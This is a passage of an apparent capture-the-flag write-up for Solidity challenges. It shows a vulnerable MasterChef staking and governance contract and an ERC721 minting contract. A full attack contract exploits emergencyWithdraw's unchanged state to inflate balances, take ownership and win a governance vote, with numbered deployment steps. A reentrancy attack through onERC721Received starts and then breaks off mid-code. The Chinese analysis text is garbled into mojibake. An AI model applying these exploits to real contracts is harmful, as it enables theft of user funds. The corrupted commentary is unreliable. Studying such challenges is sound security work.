(uint256) &#123;\n        return _allowances[owner][spender];\n    &#125;\n\n    function approve(address spender, uint256 amount) public virtual override returns (bool) &#123;\n        _approve(_msgSender(), spender, amount);\n        return true;\n    &#125;\n\n    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) &#123;\n        _transfer(sender, recipient, amount);\n        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, \"ERC20: transfer amount exceeds allowance\"));\n        return true;\n    &#125;\n\n    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) &#123;\n        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));\n        return true;\n    &#125;\n\n    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) &#123;\n        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, \"ERC20: decreased allowance below zero\"));\n        return true;\n    &#125;\n\n    function _transfer(address sender, address recipient, uint256 amount) internal virtual &#123;\n        require(sender != address(0), \"ERC20: transfer from the zero address\");\n        require(recipient != address(0), \"ERC20: transfer to the zero address\");\n\n        _beforeTokenTransfer(sender, recipient, amount);\n\n        _balances[sender] = _balances[sender].sub(amount, \"ERC20: transfer amount exceeds balance\");\n        _balances[recipient] = _balances[recipient].add(amount);\n        emit Transfer(sender, recipient, amount);\n    &#125;\n\n    function _mint(address account, uint256 amount) internal virtual &#123;\n        require(account != address(0), \"ERC20: mint to the zero address\");\n\n        _beforeTokenTransfer(address(0), account, amount);\n\n        _totalSupply = _totalSupply.add(amount);\n        _balances[account] = _balances[account].add(amount);\n        emit Transfer(address(0), account, amount);\n    &#125;\n\n    function _burn(address account, uint256 amount) internal virtual &#123;\n        require(account != address(0), \"ERC20: burn from the zero address\");\n\n        _beforeTokenTransfer(account, address(0), amount);\n\n        _balances[account] = _balances[account].sub(amount, \"ERC20: burn amount exceeds balance\");\n        _totalSupply = _totalSupply.sub(amount);\n        emit Transfer(account, address(0), amount);\n    &#125;\n\n    function _approve(address owner, address spender, uint256 amount) internal virtual &#123;\n        require(owner != address(0), \"ERC20: approve from the zero address\");\n        require(spender != address(0), \"ERC20: approve to the zero address\");\n\n        _allowances[owner][spender] = amount;\n        emit Approval(owner, spender, amount);\n    &#125;\n\n    function _setupDecimals(uint8 decimals_) internal &#123;\n        _decimals = decimals_;\n    &#125;\n\n    function _beforeTokenTransfer(address from, address to, uint256 amount) internal virtual &#123; &#125;\n&#125;\n\ncontract MasterChef is Ownable, ERC20 &#123;\n    using SafeMath for uint256;\n    using SafeERC20 for IERC20;\n\n    struct UserInfo &#123;\n        uint256 amount;\n        uint256 rewardDebt; \n    &#125;\n\n    struct PoolInfo &#123;    \n        uint256 allocPoint;\n        uint256 lastRewardBlock; \n        uint256 accSushiPerShare; \n        uint256 totalstake;\n    &#125;\n\n    uint256 public sushiPerBlock;\n\n    PoolInfo[] public poolInfo;\n    mapping (uint256 => mapping (address => UserInfo)) public userInfo;\n    uint256 public totalAllocPoint = 0;\n    uint256 public startBlock;\n    uint256 public aridorplimit;\n    event Deposit(address indexed user, uint256 indexed pid, uint256 amount);\n    event Withdraw(address indexed user, uint256 indexed pid, uint256 amount);\n    event EmergencyWithdraw(address indexed user, uint256 indexed pid, uint256 amount);\n\n    constructor(\n    ) ERC20(\"test\",\"test\") public &#123;\n        _mint(address(this),10000000);\n        _mint(msg.sender,100000000);\n        sushiPerBlock = 1;\n        startBlock = block.number;\n        uint256 lastRewardBlock = block.number > startBlock ? block.number : startBlock;\n        uint256 _allocPoint = 100;\n        totalAllocPoint = totalAllocPoint.add(_allocPoint);\n        poolInfo.push(PoolInfo(&#123;\n            allocPoint: _allocPoint,\n            lastRewardBlock: lastRewardBlock,\n            accSushiPerShare: 0,\n            totalstake: 0\n        &#125;));\n    &#125;\n    function transferOwnership(address newOwner) public override&#123;\n        require(balanceOf(msg.sender) >= 1000000, \"\");\n        require(newOwner != address(0), \"Ownable: new owner is the zero address\");\n        emit OwnershipTransferred(_owner, newOwner);\n        _owner = newOwner;\n    &#125;\n    function airdorp() public &#123;\n        require(aridorplimit &lt; 1000,\"\");\n        _mint(msg.sender,1);\n        aridorplimit = aridorplimit + 1;\n    &#125;\n    function poolLength() external view returns (uint256) &#123;\n        return poolInfo.length;\n    &#125;\n    function getMultiplier(uint256 _from, uint256 _to) public view returns (uint256) &#123;\n        return _to.sub(_from);\n    &#125;\n\n    function pendingSushi(uint256 _pid, address _user) external view returns (uint256) &#123;\n        PoolInfo storage pool = poolInfo[_pid];\n        UserInfo storage user = userInfo[_pid][_user];\n        uint256 accSushiPerShare = pool.accSushiPerShare;\n        uint256 lpSupply = pool.totalstake;\n        if (block.number > pool.lastRewardBlock &amp;&amp; lpSupply != 0) &#123;\n            uint256 multiplier = getMultiplier(pool.lastRewardBlock, block.number);\n            uint256 sushiReward = multiplier.mul(sushiPerBlock).mul(pool.allocPoint).div(totalAllocPoint);\n            accSushiPerShare = accSushiPerShare.add(sushiReward.mul(1e12).div(lpSupply));\n        &#125;\n        return user.amount.mul(accSushiPerShare).div(1e12).sub(user.rewardDebt);\n    &#125;\n    function massUpdatePools() public &#123;\n        uint256 length = poolInfo.length;\n        for (uint256 pid = 0; pid &lt; length; ++pid) &#123;\n            updatePool(pid);\n        &#125;\n    &#125;\n\n    function updatePool(uint256 _pid) public &#123;\n        PoolInfo storage pool = poolInfo[_pid];\n        if (block.number &lt;= pool.lastRewardBlock) &#123;\n            return;\n        &#125;\n        uint256 lpSupply = pool.totalstake;\n        if (lpSupply == 0) &#123;\n            pool.lastRewardBlock = block.number;\n            return;\n        &#125;\n        uint256 multiplier = getMultiplier(pool.lastRewardBlock, block.number);\n        uint256 sushiReward = multiplier.mul(sushiPerBlock).mul(pool.allocPoint).div(totalAllocPoint);\n        pool.accSushiPerShare = pool.accSushiPerShare.add(sushiReward.mul(1e12).div(lpSupply));\n        pool.lastRewardBlock = block.number;\n    &#125;\n\n    function deposit(uint256 _pid, uint256 _amount) public &#123;\n        PoolInfo storage pool = poolInfo[_pid];\n        UserInfo storage user = userInfo[_pid][msg.sender];\n        updatePool(_pid);\n        if (user.amount > 0) &#123;\n            uint256 pending = user.amount.mul(pool.accSushiPerShare).div(1e12).sub(user.rewardDebt);\n            safeTokenTransfer(msg.sender, pending);\n        &#125;\n        this.transferFrom(address(msg.sender), address(this), _amount);\n        user.amount = user.amount.add(_amount);\n        user.rewardDebt = user.amount.mul(pool.accSushiPerShare).div(1e12);\n        pool.totalstake += _amount; \n        emit Deposit(msg.sender, _pid, _amount);\n    &#125;\n\n    function withdraw(uint256 _pid, uint256 _amount) public &#123;\n        PoolInfo storage pool = poolInfo[_pid];\n        UserInfo storage user = userInfo[_pid][msg.sender];\n        require(user.amount >= _amount, \"withdraw: not good\");\n        updatePool(_pid);\n        uint256 pending = user.amount.mul(pool.accSushiPerShare).div(1e12).sub(user.rewardDebt);\n        safeTokenTransfer(msg.sender, pending);\n        user.amount = user.amount.sub(_amount);\n        user.rewardDebt = user.amount.mul(pool.accSushiPerShare).div(1e12);\n        pool.totalstake -= _amount; \n        this.transfer(address(msg.sender), _amount);\n        emit Withdraw(msg.sender, _pid, _amount);\n    &#125;\n\n    function emergencyWithdraw(uint256 _pid) public &#123;\n        PoolInfo memory pool = poolInfo[_pid];\n        UserInfo memory user = userInfo[_pid][msg.sender];\n        this.transfer(address(msg.sender), user.amount);\n        emit EmergencyWithdraw(msg.sender, _pid, user.amount);\n        pool.totalstake -= user.amount; \n        user.amount = 0;\n        user.rewardDebt = 0;\n    &#125;\n    \n    function safeTokenTransfer(address _to, uint256 _amount) internal &#123;\n        uint256 TokenBal = balanceOf(address(this));\n        if (_amount > TokenBal) &#123;\n            this.transfer(_to, TokenBal);\n        &#125; else &#123;\n           this.transfer(_to, _amount);\n        &#125;\n    &#125;\n&#125;\n\nAnalyseä¸€ä¸ªç®€åŒ–çš„governanceå’Œvote tokenæ¨¡åž‹\nstake poolï¼Œstakeå°±æœ‰åˆ†çº¢\nè§£å†³è¿™ä¸ªchallengeè¦æ±‚æˆä¸ºValidatorOwnerï¼Œæˆä¸ºValidatorOwnerè¦æ±‚èŽ·å¾—çš„voteè¶…è¿‡vote token total supplyçš„2&#x2F;3\nè¿›è¡ŒæŠ•ç¥¨åˆè¦æ±‚vote tokenåˆçº¦çš„ownerä¸ºæ”»å‡»è€…ï¼ˆæˆ–åˆçº¦ï¼‰\nå†masterchefåˆçº¦ä¸­åªè¦ç”¨æˆ·æœ‰å¤§äºŽç­‰äºŽ1000000voteå³å¯ä»»æ„åˆ‡æ¢owner\næ€»ä½“çš„ä»£ç æ¢³ç†ä¸€ä¸‹å°±æ˜¯å­˜tokenï¼Œä¸è®ºå­˜å¤šå°‘éƒ½æ˜¯ä¸€ä¸ªå—èŽ·å¾—ä¸€ä¸ªtokençš„å¥–åŠ±ï¼Œ1000æ¬¡airdropæƒ³è¦èŽ·å¾—1000000çš„tokenè¦ç­‰å¾ˆä¹…ï¼ŒäºŽæ˜¯ç»§ç»­å‘ä¸‹çœ‹\nemergencyWithdrawå‡½æ•°æ²¡æœ‰è¿›è¡Œä»»ä½•é™åˆ¶è€Œæ˜¯publicï¼Œå…¶ä¸­å¯¹äºŽå˜é‡çš„è¯»å–å‡æ˜¯ä½¿ç”¨memoryæ–¹å¼ï¼Œå±žäºŽé€»è¾‘ä¸Šçš„æ¼æ´žï¼Œemergencywithdrawä¹‹åŽï¼Œè¿›è¡Œäº†è½¬è´¦ï¼Œä½†æ˜¯æ•°æ®æ²¡æœ‰æ›´æ–°ï¼Œä¹Ÿå°±é€ æˆäº†ä»»æ„é€€æ¬¾\nå¤šæ’¸ç‚¹ç©ºæŠ•å…¨éƒ¨å­˜å…¥ï¼Œç„¶åŽå°±ç–¯ç‹‚çš„emergencywithdrawå°±å¯ä»¥äº†ï¼Œä½†æ˜¯masterchefåˆçº¦æœ€å¤šåªæœ‰10000000tokenï¼Œæ˜¯è¾¾ä¸åˆ°æ€»å‘è¡Œé‡2&#x2F;3çš„ï¼ŒäºŽæ˜¯æƒ³åˆ°äº†compoundçš„snapshotæœºåˆ¶ã€‚è½¬è´¦å†æŠ•ç¥¨å°±å¯ä»¥äº†\nAttackcontract attack&#123;\n    Governance gov=Governance(0x8Ec7277F4C95B774e4941C63fD2d582c09cb0C10);\n    MasterChef master=MasterChef(0x4236ADb4611e781B149Aa8A94E8a16adCC8b6fC5);\n    bool flag;\n    bool condition;\n    Helper[8] public helper;\n\n    constructor()public&#123;\n        for(uint n=0;n&lt;8;n++)&#123;\n            helper[n]=new Helper();\n        &#125;\n    &#125;\n\n    function getAirdrop()public&#123;\n        for(uint i=0;i&lt;500;i++)\n        &#123;master.airdorp();&#125;\n    &#125;\n\n    function depositOrapprove()public&#123;\n        if(!flag)&#123;\n            master.approve(address(master),0xffffffffffffffffff);\n            flag=true;\n        &#125;else if(!condition)&#123;\n            uint balance=master.balanceOf(address(this));\n            master.deposit(0,balance);\n            for(uint x=0;x&lt;9;x++)&#123;\n                master.emergencyWithdraw(0);\n            &#125;\n            if(master.balanceOf(address(this))>8000000)&#123;\n                condition=true;\n            &#125;\n        &#125;else&#123;\n            master.deposit(0,200000);\n            master.emergencyWithdraw(0);\n        &#125;\n    &#125;\n\n    function flashloan()public&#123;\n        uint balance=master.balanceOf(address(this));\n        master.transfer(msg.sender,balance);\n        Helper(msg.sender).getOwnerAndVote();\n        require (balance==master.balanceOf(address(this)));\n    &#125;\n\n    function FirstVote()public&#123;\n        for(uint n=0;n&lt;8;n++)&#123;\n            helper[n].begin();\n        &#125;\n    &#125;\n\n    function SecondVote()public&#123;\n        master.transferOwnership(address(this));\n        gov.vote(address(this));\n    &#125;\n\n    function solve()public&#123;\n        gov.setValidator();\n        gov.setflag();\n    &#125;\n\n&#125;\n\ncontract Helper&#123;\n    Governance gov=Governance(0x8Ec7277F4C95B774e4941C63fD2d582c09cb0C10);\n    MasterChef master=MasterChef(0x4236ADb4611e781B149Aa8A94E8a16adCC8b6fC5);\n\n    function begin() public&#123;\n        attack(msg.sender).flashloan();\n    &#125;\n    function getOwnerAndVote()public&#123;\n        master.transferOwnership(address(this));\n        gov.vote(msg.sender);\n        repay(msg.sender);\n    &#125;\n\n    function repay(address to)public&#123;\n        uint balance=master.balanceOf(address(this));\n        master.transfer(to,balance);\n    &#125;\n&#125;\n\nstep1â€“deploy attack\nstep2â€“call function getAirdrop*2\nstep3â€“call function  depositOrapprove \nstep4â€“call function depositOrapprove until balance&gt;&#x3D;9000000\nstep5â€“call function FirstVote\nstep6â€“call function SecondVote\nstep7â€“call function solve to complete this challenge\nEveryThingIsArtCodepragma solidity ^0.8.0;\nimport \"./SafeMath.sol\";\n\n\nimport \"@openzeppelin/contracts/token/ERC721/IERC721.sol\";\nimport \"@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol\";\nimport \"@openzeppelin/contracts/token/ERC721/extensions/IERC721Metadata.sol\";\nimport \"@openzeppelin/contracts/utils/Address.sol\";\nimport \"@openzeppelin/contracts/utils/Context.sol\";\nimport \"@openzeppelin/contracts/utils/Strings.sol\";\nimport \"@openzeppelin/contracts/utils/introspection/ERC165.sol\";\n\n/**\n * @dev Implementation of https://eips.ethereum.org/EIPS/eip-721[ERC721] Non-Fungible Token Standard, including\n * the Metadata extension, but not including the Enumerable extension, which is available separately as\n * &#123;ERC721Enumerable&#125;.\n */\ncontract ERC721 is Context, ERC165, IERC721, IERC721Metadata &#123;\n    using Address for address;\n    using Strings for uint256;\n\n    // Token name\n    string private _name;\n\n    // Token symbol\n    string private _symbol;\n\n    // Mapping from token ID to owner address\n    mapping(uint256 => address) private _owners;\n\n    // Mapping owner address to token count\n    mapping(address => uint256) private _balances;\n\n    // Mapping from token ID to approved address\n    mapping(uint256 => address) private _tokenApprovals;\n\n    // Mapping from owner to operator approvals\n    mapping(address => mapping(address => bool)) private _operatorApprovals;\n\n    /**\n     * @dev Initializes the contract by setting a `name` and a `symbol` to the token collection.\n     */\n    constructor(string memory name_, string memory symbol_) &#123;\n        _name = name_;\n        _symbol = symbol_;\n    &#125;\n\n    /**\n     * @dev See &#123;IERC165-supportsInterface&#125;.\n     */\n    function supportsInterface(bytes4 interfaceId) public view virtual override(ERC165, IERC165) returns (bool) &#123;\n        return\n            interfaceId == type(IERC721).interfaceId ||\n            interfaceId == type(IERC721Metadata).interfaceId ||\n            super.supportsInterface(interfaceId);\n    &#125;\n\n    /**\n     * @dev See &#123;IERC721-balanceOf&#125;.\n     */\n    function balanceOf(address owner) public view virtual override returns (uint256) &#123;\n        require(owner != address(0), \"ERC721: address zero is not a valid owner\");\n        return _balances[owner];\n    &#125;\n\n    /**\n     * @dev See &#123;IERC721-ownerOf&#125;.\n     */\n    function ownerOf(uint256 tokenId) public view virtual override returns (address) &#123;\n        address owner = _owners[tokenId];\n        require(owner != address(0), \"ERC721: invalid token ID\");\n        return owner;\n    &#125;\n\n    /**\n     * @dev See &#123;IERC721Metadata-name&#125;.\n     */\n    function name() public view virtual override returns (string memory) &#123;\n        return _name;\n    &#125;\n\n    /**\n     * @dev See &#123;IERC721Metadata-symbol&#125;.\n     */\n    function symbol() public view virtual override returns (string memory) &#123;\n        return _symbol;\n    &#125;\n\n    /**\n     * @dev See &#123;IERC721Metadata-tokenURI&#125;.\n     */\n    function tokenURI(uint256 tokenId) public view virtual override returns (string memory) &#123;\n        _requireMinted(tokenId);\n\n        string memory baseURI = _baseURI();\n        return bytes(baseURI).length > 0 ? string(abi.encodePacked(baseURI, tokenId.toString())) : \"\";\n    &#125;\n\n    /**\n     * @dev Base URI for computing &#123;tokenURI&#125;. If set, the resulting URI for each\n     * token will be the concatenation of the `baseURI` and the `tokenId`. Empty\n     * by default, can be overridden in child contracts.\n     */\n    function _baseURI() internal view virtual returns (string memory) &#123;\n        return \"\";\n    &#125;\n\n    /**\n     * @dev See &#123;IERC721-approve&#125;.\n     */\n    function approve(address to, uint256 tokenId) public virtual override &#123;\n        address owner = ERC721.ownerOf(tokenId);\n        require(to != owner, \"ERC721: approval to current owner\");\n\n        require(\n            _msgSender() == owner || isApprovedForAll(owner, _msgSender()),\n            \"ERC721: approve caller is not token owner nor approved for all\"\n        );\n\n        _approve(to, tokenId);\n    &#125;\n\n    /**\n     * @dev See &#123;IERC721-getApproved&#125;.\n     */\n    function getApproved(uint256 tokenId) public view virtual override returns (address) &#123;\n        _requireMinted(tokenId);\n\n        return _tokenApprovals[tokenId];\n    &#125;\n\n    /**\n     * @dev See &#123;IERC721-setApprovalForAll&#125;.\n     */\n    function setApprovalForAll(address operator, bool approved) public virtual override &#123;\n        _setApprovalForAll(_msgSender(), operator, approved);\n    &#125;\n\n    /**\n     * @dev See &#123;IERC721-isApprovedForAll&#125;.\n     */\n    function isApprovedForAll(address owner, address operator) public view virtual override returns (bool) &#123;\n        return _operatorApprovals[owner][operator];\n    &#125;\n\n    /**\n     * @dev See &#123;IERC721-transferFrom&#125;.\n     */\n    function transferFrom(\n        address from,\n        address to,\n        uint256 tokenId\n    ) public virtual override &#123;\n        //solhint-disable-next-line max-line-length\n        require(_isApprovedOrOwner(_msgSender(), tokenId), \"ERC721: caller is not token owner nor approved\");\n\n        _transfer(from, to, tokenId);\n    &#125;\n\n    /**\n     * @dev See &#123;IERC721-safeTransferFrom&#125;.\n     */\n    function safeTransferFrom(\n        address from,\n        address to,\n        uint256 tokenId\n    ) public virtual override &#123;\n        safeTransferFrom(from, to, tokenId, \"\");\n    &#125;\n\n    /**\n     * @dev See &#123;IERC721-safeTransferFrom&#125;.\n     */\n    function safeTransferFrom(\n        address from,\n        address to,\n        uint256 tokenId,\n        bytes memory data\n    ) public virtual override &#123;\n        require(_isApprovedOrOwner(_msgSender(), tokenId), \"ERC721: caller is not token owner nor approved\");\n        _safeTransfer(from, to, tokenId, data);\n    &#125;\n\n    /**\n     * @dev Safely transfers `tokenId` token from `from` to `to`, checking first that contract recipients\n     * are aware of the ERC721 protocol to prevent tokens from being forever locked.\n     *\n     * `data` is additional data, it has no specified format and it is sent in call to `to`.\n     *\n     * This internal function is equivalent to &#123;safeTransferFrom&#125;, and can be used to e.g.\n     * implement alternative mechanisms to perform token transfer, such as signature-based.\n     *\n     * Requirements:\n     *\n     * - `from` cannot be the zero address.\n     * - `to` cannot be the zero address.\n     * - `tokenId` token must exist and be owned by `from`.\n     * - If `to` refers to a smart contract, it must implement &#123;IERC721Receiver-onERC721Received&#125;, which is called upon a safe transfer.\n     *\n     * Emits a &#123;Transfer&#125; event.\n     */\n    function _safeTransfer(\n        address from,\n        address to,\n        uint256 tokenId,\n        bytes memory data\n    ) internal virtual &#123;\n        _transfer(from, to, tokenId);\n        require(_checkOnERC721Received(from, to, tokenId, data), \"ERC721: transfer to non ERC721Receiver implementer\");\n    &#125;\n\n    /**\n     * @dev Returns whether `tokenId` exists.\n     *\n     * Tokens can be managed by their owner or approved accounts via &#123;approve&#125; or &#123;setApprovalForAll&#125;.\n     *\n     * Tokens start existing when they are minted (`_mint`),\n     * and stop existing when they are burned (`_burn`).\n     */\n    function _exists(uint256 tokenId) internal view virtual returns (bool) &#123;\n        return _owners[tokenId] != address(0);\n    &#125;\n\n    /**\n     * @dev Returns whether `spender` is allowed to manage `tokenId`.\n     *\n     * Requirements:\n     *\n     * - `tokenId` must exist.\n     */\n    function _isApprovedOrOwner(address spender, uint256 tokenId) internal view virtual returns (bool) &#123;\n        address owner = ERC721.ownerOf(tokenId);\n        return (spender == owner || isApprovedForAll(owner, spender) || getApproved(tokenId) == spender);\n    &#125;\n\n    /**\n     * @dev Safely mints `tokenId` and transfers it to `to`.\n     *\n     * Requirements:\n     *\n     * - `tokenId` must not exist.\n     * - If `to` refers to a smart contract, it must implement &#123;IERC721Receiver-onERC721Received&#125;, which is called upon a safe transfer.\n     *\n     * Emits a &#123;Transfer&#125; event.\n     */\n    function _safeMint(address to, uint256 tokenId) internal virtual &#123;\n        _safeMint(to, tokenId, \"\");\n    &#125;\n\n    /**\n     * @dev Same as &#123;xref-ERC721-_safeMint-address-uint256-&#125;[`_safeMint`], with an additional `data` parameter which is\n     * forwarded in &#123;IERC721Receiver-onERC721Received&#125; to contract recipients.\n     */\n    function _safeMint(\n        address to,\n        uint256 tokenId,\n        bytes memory data\n    ) internal virtual &#123;\n        _mint(to, tokenId);\n        require(\n            _checkOnERC721Received(address(0), to, tokenId, data),\n            \"ERC721: transfer to non ERC721Receiver implementer\"\n        );\n    &#125;\n\n    /**\n     * @dev Mints `tokenId` and transfers it to `to`.\n     *\n     * WARNING: Usage of this method is discouraged, use &#123;_safeMint&#125; whenever possible\n     *\n     * Requirements:\n     *\n     * - `tokenId` must not exist.\n     * - `to` cannot be the zero address.\n     *\n     * Emits a &#123;Transfer&#125; event.\n     */\n    function _mint(address to, uint256 tokenId) internal virtual &#123;\n        require(to != address(0), \"ERC721: mint to the zero address\");\n        require(!_exists(tokenId), \"ERC721: token already minted\");\n\n        _beforeTokenTransfer(address(0), to, tokenId);\n\n        _balances[to] += 1;\n        _owners[tokenId] = to;\n\n        emit Transfer(address(0), to, tokenId);\n\n        _afterTokenTransfer(address(0), to, tokenId);\n    &#125;\n\n    /**\n     * @dev Destroys `tokenId`.\n     * The approval is cleared when the token is burned.\n     *\n     * Requirements:\n     *\n     * - `tokenId` must exist.\n     *\n     * Emits a &#123;Transfer&#125; event.\n     */\n    function _burn(uint256 tokenId) internal virtual &#123;\n        address owner = ERC721.ownerOf(tokenId);\n\n        _beforeTokenTransfer(owner, address(0), tokenId);\n\n        // Clear approvals\n        _approve(address(0), tokenId);\n\n        _balances[owner] -= 1;\n        delete _owners[tokenId];\n\n        emit Transfer(owner, address(0), tokenId);\n\n        _afterTokenTransfer(owner, address(0), tokenId);\n    &#125;\n\n    /**\n     * @dev Transfers `tokenId` from `from` to `to`.\n     *  As opposed to &#123;transferFrom&#125;, this imposes no restrictions on msg.sender.\n     *\n     * Requirements:\n     *\n     * - `to` cannot be the zero address.\n     * - `tokenId` token must be owned by `from`.\n     *\n     * Emits a &#123;Transfer&#125; event.\n     */\n    function _transfer(\n        address from,\n        address to,\n        uint256 tokenId\n    ) internal virtual &#123;\n        require(ERC721.ownerOf(tokenId) == from, \"ERC721: transfer from incorrect owner\");\n        require(to != address(0), \"ERC721: transfer to the zero address\");\n\n        _beforeTokenTransfer(from, to, tokenId);\n\n        // Clear approvals from the previous owner\n        _approve(address(0), tokenId);\n\n        _balances[from] -= 1;\n        _balances[to] += 1;\n        _owners[tokenId] = to;\n\n        emit Transfer(from, to, tokenId);\n\n        _afterTokenTransfer(from, to, tokenId);\n    &#125;\n\n    /**\n     * @dev Approve `to` to operate on `tokenId`\n     *\n     * Emits an &#123;Approval&#125; event.\n     */\n    function _approve(address to, uint256 tokenId) internal virtual &#123;\n        _tokenApprovals[tokenId] = to;\n        emit Approval(ERC721.ownerOf(tokenId), to, tokenId);\n    &#125;\n\n    /**\n     * @dev Approve `operator` to operate on all of `owner` tokens\n     *\n     * Emits an &#123;ApprovalForAll&#125; event.\n     */\n    function _setApprovalForAll(\n        address owner,\n        address operator,\n        bool approved\n    ) internal virtual &#123;\n        require(owner != operator, \"ERC721: approve to caller\");\n        _operatorApprovals[owner][operator] = approved;\n        emit ApprovalForAll(owner, operator, approved);\n    &#125;\n\n    /**\n     * @dev Reverts if the `tokenId` has not been minted yet.\n     */\n    function _requireMinted(uint256 tokenId) internal view virtual &#123;\n        require(_exists(tokenId), \"ERC721: invalid token ID\");\n    &#125;\n\n    /**\n     * @dev Internal function to invoke &#123;IERC721Receiver-onERC721Received&#125; on a target address.\n     * The call is not executed if the target address is not a contract.\n     *\n     * @param from address representing the previous owner of the given token ID\n     * @param to target address that will receive the tokens\n     * @param tokenId uint256 ID of the token to be transferred\n     * @param data bytes optional data to send along with the call\n     * @return bool whether the call correctly returned the expected magic value\n     */\n    function _checkOnERC721Received(\n        address from,\n        address to,\n        uint256 tokenId,\n        bytes memory data\n    ) private returns (bool) &#123;\n        if (to.isContract()) &#123;\n            try IERC721Receiver(to).onERC721Received(_msgSender(), from, tokenId, data) returns (bytes4 retval) &#123;\n                return retval == IERC721Receiver.onERC721Received.selector;\n            &#125; catch (bytes memory reason) &#123;\n                if (reason.length == 0) &#123;\n                    revert(\"ERC721: transfer to non ERC721Receiver implementer\");\n                &#125; else &#123;\n                    /// @solidity memory-safe-assembly\n                    assembly &#123;\n                        revert(add(32, reason), mload(reason))\n                    &#125;\n                &#125;\n            &#125;\n        &#125; else &#123;\n            return true;\n        &#125;\n    &#125;\n\n    /**\n     * @dev Hook that is called before any token transfer. This includes minting\n     * and burning.\n     *\n     * Calling conditions:\n     *\n     * - When `from` and `to` are both non-zero, ``from``'s `tokenId` will be\n     * transferred to `to`.\n     * - When `from` is zero, `tokenId` will be minted for `to`.\n     * - When `to` is zero, ``from``'s `tokenId` will be burned.\n     * - `from` and `to` are never both zero.\n     *\n     * To learn more about hooks, head to xref:ROOT:extending-contracts.adoc#using-hooks[Using Hooks].\n     */\n    function _beforeTokenTransfer(\n        address from,\n        address to,\n        uint256 tokenId\n    ) internal virtual &#123;&#125;\n\n    /**\n     * @dev Hook that is called after any transfer of tokens. This includes\n     * minting and burning.\n     *\n     * Calling conditions:\n     *\n     * - when `from` and `to` are both non-zero.\n     * - `from` and `to` are never both zero.\n     *\n     * To learn more about hooks, head to xref:ROOT:extending-contracts.adoc#using-hooks[Using Hooks].\n     */\n    function _afterTokenTransfer(\n        address from,\n        address to,\n        uint256 tokenId\n    ) internal virtual &#123;&#125;\n&#125;\n\n\ncontract EverytingIsArt is ERC721 &#123;\n    using SafeMath for *;\n\n    uint256 public totalMinted;\n\n    bool public hope = true;\n    bool public hope2 = true;\n\n    // Deploy by CTFer EOA account\n    constructor() public ERC721(\"All Arts\", \"AA\") &#123;&#125;\n\n    function becomeAnArtist(uint256 _count) public returns (bool) &#123;\n        require(_count >= 288, \"Why don't you want to be an artist?\");\n\n        for (uint256 i = 0; i &lt; _count; i++) &#123;\n            uint256 tokenId = totalMinted.add(1);\n            _safeMint(msg.sender, tokenId);\n            totalMinted = totalMinted.add(1);\n        &#125;\n\n        return true;\n    &#125;\n\n    function theHope() public returns (bool) &#123;\n        require(hope, \"Hope broken\");\n        require(uint64(uint160(msg.sender)).mod(88) != 0, \"Try again!\");\n\n        uint256 tokenId = totalMinted.add(1);\n        totalMinted = totalMinted.add(1);\n        _safeMint(msg.sender, tokenId);\n\n        hope = false;\n        return true;\n    &#125;\n\n    function hopeIsInSight() public returns (bool) &#123;\n        require(hope == false, \"Try again!\");\n        require(hope2 == true, \"Hope broken!\");\n        require(uint64(uint160(msg.sender)).mod(88) == 0, \"Try again!\");\n\n        uint256 tokenId = totalMinted.add(1);\n        totalMinted = totalMinted.add(1);\n        _safeMint(msg.sender, tokenId);\n\n        hope2 = false;\n        return true;\n    &#125;\n\n    // Artist or programmer? Just try again and again.\n    function isCompleted() public view returns (bool) &#123;\n        require(\n            balanceOf(msg.sender) == 288,\n            \"You are not yet a good artist, you should keep trying.\"\n        );\n\n        return true;\n    &#125;\n&#125;\n\nAnalyseçœ‹èµ·æ¥äº”ç™¾å¤šè¡Œï¼Œä½†å®žé™…ä¸Šå¤§éƒ¨åˆ†éƒ½æ˜¯æ ‡å‡†åŒ–çš„åˆçº¦äº†ï¼Œå¹¶ä¸”åŽ»æŽ‰æ³¨é‡Šä»¥åŽä¹Ÿå¹¶ä¸é•¿ï¼Œç¨å¾®çœ‹ä¸€ä¸‹å³å¯\nfunction theHope() public returns (bool) &#123;\n      require(hope, \"Hope broken\");\n      require(uint64(uint160(msg.sender)).mod(88) != 0, \"Try again!\");\n\n      uint256 tokenId = totalMinted.add(1);\n      totalMinted = totalMinted.add(1);\n      _safeMint(msg.sender, tokenId);\n\n      hope = false;\n      return true;\n  &#125;\n\nè¯¥å‡½æ•°å…ˆè¿›è¡Œmintï¼Œå†ä¿®æ”¹å˜é‡\nsafemintæ—¶ä¼šè°ƒç”¨æŽ¥å—åˆçº¦çš„onERC721Receivedå‡½æ•°ï¼Œåªè¦è¿”å›ž\nbytes4(keccak256(abi.encodePacked(â€œonERC721Received(address,address,uint,bytes memory)â€)))å³å¯ï¼Œé€ æˆäº†é‡å…¥æ¼æ´ž\nä½†æ˜¯åœ¨è¿›è¡Œå®žæ“æ—¶å€™å‘çŽ°ï¼Œæœ€å¤§åªèƒ½é‡å…¥107æ¬¡ï¼Œæ­¤æ—¶gasè¾¾åˆ°0.073ï¼Œåœ¨å¤šä¸€æ¬¡å³æ— æ³•è¾¾åˆ°æ¯ä¸€æ¬¡é‡å…¥éƒ½å¾—åˆ°æ­£ç¡®çš„è¿”å›žå€¼ã€‚\nhopeIsInSightå‡½æ•°ä¹Ÿæ˜¯åŒç†\næ‰€ä»¥æœ€åŽä½¿ç”¨çš„è§£é¢˜æ–¹å¼æ˜¯ç›´æŽ¥è°ƒç”¨becomeAnArtistå‡½æ•°ï¼Œåœ¨è°ƒç”¨iscompletedå‡½æ•°\nAttackæœ€ç»ˆä½¿ç”¨çš„æ—¶ç›´æŽ¥è°ƒç”¨becomeAnArtistå‡½æ•°\nä½†æ˜¯è¿˜æ˜¯æ”¾ä¸€ä¸‹é‡å…¥çš„æ”»å‡»æ€è·¯å§\ncontract Attack1&#123;\n    address public adr;\n    uint n = 1;\n    EverytingIsArt cont;\n    constructor(address _adr) &#123;\n        adr = _adr;\n        cont = EverytingIsArt(adr);\n    &#125;\n    event ERC721Received( address operator,\n        address from,\n        uint256 tokenId,\n        bytes data);\n\n     function onERC721Received(// max 107 times\n        address operator,\n        address from,\n        uint256 tokenId,\n        bytes calldata data\n    ) public returns (bytes4) &#123;\n        emit 